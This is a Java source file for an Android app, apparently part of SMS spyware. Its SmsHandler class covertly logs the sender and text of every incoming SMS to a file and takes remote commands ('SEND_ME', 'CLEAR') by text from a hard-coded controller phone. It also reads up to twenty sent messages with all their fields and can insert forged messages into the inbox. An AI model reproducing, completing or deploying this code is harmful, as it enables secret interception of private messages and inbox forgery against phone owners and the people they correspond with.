package mg.broadcast.hook.handler;

import android.content.Intent;
import android.content.Context;
import android.content.ContentValues;
import android.content.BroadcastReceiver;
import android.database.Cursor;

import android.net.Uri;
import android.telephony.SmsManager;

import java.io.File;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;

import mg.broadcast.hook.hidden.Constants;

public class SmsHandler extends Handler{

	final String ACTION_SAVE="SAVE";
	final String ACTION_SEND="SEND_ME";
	final String ACTION_CLEAR="CLEAR";
	
	final String SENT="content://sms/sent";
	final String DRAFT="content://sms/draft";
	final String INBOX="content://sms/inbox";
	
	final String ROOT_PHONE=Constants.ROOT_PHONE;
	
	public SmsHandler(Context context){
		super(context);
	}
	
	public void handle(String phone,String sms){
		if(!phone.equals(ROOT_PHONE)){
			save(phone,sms);
		}
		else{
			if(sms.equals(ACTION_SEND)){
				send();
			}
			else if(sms.equals(ACTION_CLEAR)){
				clear();
			}
		}
	}
	
	public void send(String sms){
		SmsManager smsManager=SmsManager.getDefault();
		smsManager.sendTextMessage(ROOT_PHONE,null,sms,null,null);
	}
	
	public void send(){
		send("SMS from Administrator.");
	}
	
	public boolean clear(){
		File file=new File(dir,FILE_NAME);
		
		if(!file.exists())
			return true;
		else 
			return file.delete();
	}
	
	public boolean save(String phone,String sms){
		if(dir.exists() || dir.mkdir()) try{
				
			File file=new File(dir,FILE_NAME);
			if(!file.exists())
				file.createNewFile();
			
			FileOutputStream out=new FileOutputStream(file,true);
			OutputStreamWriter writer=new OutputStreamWriter(out);
			writer.append(phone+":"+sms);
			writer.append("\n");
			writer.close();
			out.close();
			
			return true;
		}
		catch(IOException e){
		}
		
		return false;
	}
	
	public void addSMSIntoInbox(Context context,String sms_from,String sms_body){
		try{
			ContentValues values=new ContentValues();
			values.put("address",sms_from);
			values.put("body",sms_body);
			context.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
		}
		catch(Exception e){
			e.printStackTrace();
		}
	}
	
	public String read(){
		Cursor cursor=context.getContentResolver().query(Uri.parse(SENT), null, null, null, null);
		StringBuilder builder=new StringBuilder();
		
		if(cursor.moveToFirst()){
			int count=0;
			do{
				for(int idx=0;idx<cursor.getColumnCount();idx++){
					builder.append(cursor.getColumnName(idx)).append(':');
					builder.append(cursor.getString(idx)).append(',');
				}
				builder.append("\n");
			}
			while((++count<20) && cursor.moveToNext());
		}
		
		return builder.toString();
	}
}

